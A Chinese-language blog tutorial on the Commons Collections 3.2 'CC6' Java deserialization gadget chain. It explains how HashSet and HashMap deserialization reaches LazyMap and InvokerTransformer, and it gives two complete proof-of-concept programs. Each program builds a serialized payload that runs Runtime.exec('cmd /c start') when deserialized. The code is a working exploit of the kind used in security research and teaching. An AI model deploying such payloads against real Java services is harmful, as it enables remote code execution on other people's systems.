## 环境准备

JDK1.8(8u421)我以本地的JDK8版本为准、commons-collections(3.x 4.x均可这里使用3.2版本)

cc3.2：

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2</version>
</dependency>
```

CC1攻击链：https://www.cnblogs.com/erosion2020/p/18553568

CC5攻击链：https://www.cnblogs.com/erosion2020/p/18555069

## 正文

CC6和CC5一样也是 CC1 的一个变种，在 **CC6**（CommonsCollections6）攻击链中，`HashMap` 和 `HashSet` 起到了非常重要的作用。它们并不是攻击链的直接执行工具，而是用于 **存储恶意数据结构**，并且通过 **反序列化** 触发了恶意代码的执行。

## HashMap

**存储恶意的 `TiedMapEntry`**：`HashMap` 用来存储 `TiedMapEntry`，这个类在攻击链中起到了一个关键作用。`TiedMapEntry` 是一个键值对，它将一个 `LazyMap` 实例与一个键（如 `"foo"`）绑定在一起。通过 `LazyMap`，在访问某个键时，攻击链中的 Transformer 会被触发执行。

在 **CC6** 攻击链中，`HashMap` 将 `TiedMapEntry` 存入其中，并且通过 `keySet()` 获取 `LazyMap` 中的所有键。这个过程为后续的恶意代码执行提供了触发条件。

### 关键代码分析

 在HashMap中重写了readObject方法

```java
private void readObject(ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    ......
    for (int i = 0; i < mappings; i++) {
        @SuppressWarnings("unchecked")
            K key = (K) s.readObject();
        @SuppressWarnings("unchecked")
            V value = (V) s.readObject();
    	// 重点是这里，他调用了hash(Key)，从而触发TiedMapEntry的hashCode()方法，而从触发LazyMap中的get()方法
        putVal(hash(key), key, value, false, false);
    }
    ......
}
```

## HashSet

**存储 `HashMap` 的 `keySet()`**：`HashSet` 用来存储 `HashMap` 的 `keySet()`，即存储 `LazyMap` 中的键集合。在这个步骤中，`HashSet` 只是一个容器，用来接收 `HashMap` 中的条目集。`keySet()` 返回的是 `LazyMap` 中所有的键，而这些键与恶意的 `TiedMapEntry` 关联，这些条目会触发攻击链中的转换器（Transformer）。

`HashSet` 在反序列化时也会参与触发过程。当我们将这个 `HashSet` 序列化并反序列化后，`LazyMap` 和其中绑定的 Transformer 链会被触发，导致攻击链中的恶意行为得以执行。

在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。

### 关键代码分析

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
    // HashSet内部维护了一个map对象，但是该Map对象的值都是空Object，也就是new Object()
    private transient HashMap<E,Object> map;
    ......
    // Read in all elements in the proper order.
    for (int i=0; i<size; i++) {
        @SuppressWarnings("unchecked")
            E e = (E) s.readObject();
        // 重点在这里，他最终会调用到HashMap的put方法
        map.put(e, PRESENT);
}
// 这里就触发了HashMap的hash方法
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
// 这里就能触发hashCode方法，如果这里的参数Object key是我们准备的TiedMapEntry攻击链对象，这样在反序列化之后就能执行我们的攻击链代码了
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

```

## POC1(简化版本 - 适合初级学习调试)

ysoserial中的CC6代码中考虑到JDK的不同版本的字段差异处理，以及HashSet和HashMap中都使用到了放射的方法进行set字段值，其实我也不太理解为什么ysoserial的代码写的那么复杂，明明那些字段值可以不通过反射放进去的.....可能有其它额外的考虑，这里为了方便初学者学习，所以可以先调试这一份代码，这份代码熟练了之后可以再看一下下边我改写的ysoserial的代码，循序渐进的来。

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6 {
    static String serialFileName = "commons-collections6.ser";

    public static void main(String[] args) throws Exception {
        cc6bySimplify();
        verify();
    }

    public static void verify() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }

    public static void cc6bySimplify() throws Exception {
        String execArgs = "cmd /c start";
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{execArgs}),
                new ConstantTransformer(1) };
        // 先创建LazyMap，用来将transformerChain包装成一个Map，当Map中的get方法被触发时就能直接触发到调用链
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

        // 等同于ysoserial中的Reflections.setFieldValue(transformerChain, "iTransformers", transformers);写法
        Field iTransformers = transformerChain.getClass().getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        //TODO===========================CC6新的触发点 START By YsoSerial Simplify=============================
        HashMap map = new HashMap();
        map.put(entry, "1");
        HashSet set = new HashSet(map.keySet());
        lazyMap.clear();
        //TODO===============================CC6新的触发点 END By YsoSerial Simplify=========================
        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(set);
        oos.flush();
        oos.close();
    }
}
```

## POC2(复杂版本 - 基于ysoserial)

这是基于ysoserial的代码改造的，但是逻辑几乎是没怎么动的，只是把ysoserial中调用的工具类变成了直接的写法。

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6 {
    static String serialFileName = "commons-collections6.ser";

    public static void main(String[] args) throws Exception {
        cc6byYsoSerial();
        verify();
    }

    public static void verify() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }

    public static void cc6byYsoSerial() throws Exception {
        String execArgs = "cmd /c start";
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{execArgs}),
                new ConstantTransformer(1) };
        // 等同于ysoserial中的Reflections.setFieldValue(transformerChain, "iTransformers", transformers);写法
        Field iTransformers = transformerChain.getClass().getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);
        // 先创建LazyMap，用来将transformerChain包装成一个Map，当Map中的get方法被触发时就能直接触发到调用链
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        //TODO===========================CC6新的触发点 START By YsoSerial=============================

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, entry);


        //TODO===============================CC6新的触发点 END By YsoSerial=========================

        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.flush();
        oos.close();
    }
}
```

## 调试

来弹个cmd

![image-20241119210521358](./main.assets/cc6-1.png)

## 调用链总结

* ObjectInputStream.readObject()
  * HashSet.readObject()
    * HashMap.put()
    * HashMap.putVal()
    * HashMap.hash()
    * HashMap.hashCode()
      * TiedMapEntry.hashCode()
      * TiedMapEntry.getValue()
        * LazyMap.get()
          * ChainedTransformer.transform()
            * ConstantTransformer.transform()
            * InvokerTransformer.transform()
              * Method.invoke()
              * Class.getMethod()
            * InvokerTransformer.transform()
              * Method.invoke()
              * Runtime.getRuntime()
            * InvokerTransformer.transform()
              * Method.invoke()
              * Runtime.exec()